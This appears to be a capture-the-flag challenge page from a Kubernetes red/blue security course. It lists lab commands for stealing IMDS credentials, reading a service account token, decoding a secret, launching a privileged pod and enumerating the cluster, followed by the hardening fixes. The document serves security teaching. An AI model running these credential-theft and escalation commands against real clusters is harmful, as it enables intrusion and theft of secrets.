# Challenge 15 — Red Team Lab Boss

**Difficulty:** Insane | **Type:** Verifier | **Est. Time:** 3–4 hours

---

## Situation

This is the final exam. No guided steps. No hints until you ask.

A fully vulnerable cluster is live in `dojo-sec-boss`. It has 5 attack surfaces and 5 hardening requirements. You must complete both phases to unlock the flag.

**ACT 1 — RED TEAM**: Exploit each attack surface. Each proof token goes into a ConfigMap.

**ACT 2 — BLUE TEAM**: Harden what you just broke. The verifier checks both phases.

---

## Lab Setup

```bash
bash courses/course-38-redblue-security/challenges/15-redteam-lab-boss/setup.sh
```

This creates namespace `dojo-sec-boss` with:
- `attack-pod` — your foothold (overprivileged SA, DB creds in env var)
- `fake-imds-svc` — a simulated AWS IMDS endpoint
- `db-creds` Secret — plaintext credentials
- `overprivileged-sa` → ClusterRoleBinding (cluster-admin)

---

## ACT 1 — Attack (5 Surfaces)

```bash
kubectl exec -it attack-pod -n dojo-sec-boss -- sh
```

| # | Surface | Action |
|---|---------|--------|
| 1 | IMDS credential theft | `curl http://fake-imds-svc/latest/meta-data/iam/security-credentials/node-role` |
| 2 | SA token abuse | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` |
| 3 | Secret enumeration | `kubectl get secret db-creds -n dojo-sec-boss -o jsonpath='{.data.flag}' | base64 -d` |
| 4 | Privileged pod escape | `kubectl run pwned --image=busybox:1.36 --restart=Never --privileged=true -n dojo-sec-boss -- sleep 60` |
| 5 | Lateral movement | `kubectl get cm -A` (enumerate cluster-wide) |

For each attack, store a proof token:
```bash
kubectl create configmap attack-token-N -n dojo-sec-boss --from-literal=token=<value>
```

---

## ACT 2 — Harden (5 Steps)

| # | Fix | Command |
|---|-----|---------|
| 1 | Delete overprivileged CRB | `kubectl delete clusterrolebinding boss-overprivileged-binding` |
| 2 | Add NetworkPolicy blocking IMDS egress | `kubectl apply -f networkpolicy.yaml` |
| 3 | Remove DB_PASSWORD from pod env | Delete + recreate attack-pod without env var |
| 4 | Set PSA on namespace | `kubectl label namespace dojo-sec-boss pod-security.kubernetes.io/enforce=restricted` |
| 5 | Confirm Falco active | `kubectl create configmap falco-active -n dojo-sec-boss --from-literal=status=enabled` |

---

## Verifier

```bash
bash courses/course-38-redblue-security/challenges/15-redteam-lab-boss/verify.sh
```

Both phases must pass.

---

## What You'll Learn

- Full cloud-native kill chain: IMDS → SA token → secret exfil → privileged escape → lateral movement
- Why each misconfiguration is catastrophic when chained
- Hardening sequence: RBAC → network controls → secrets management → pod security → runtime detection
- **Defense in depth**: any single fix stops the chain
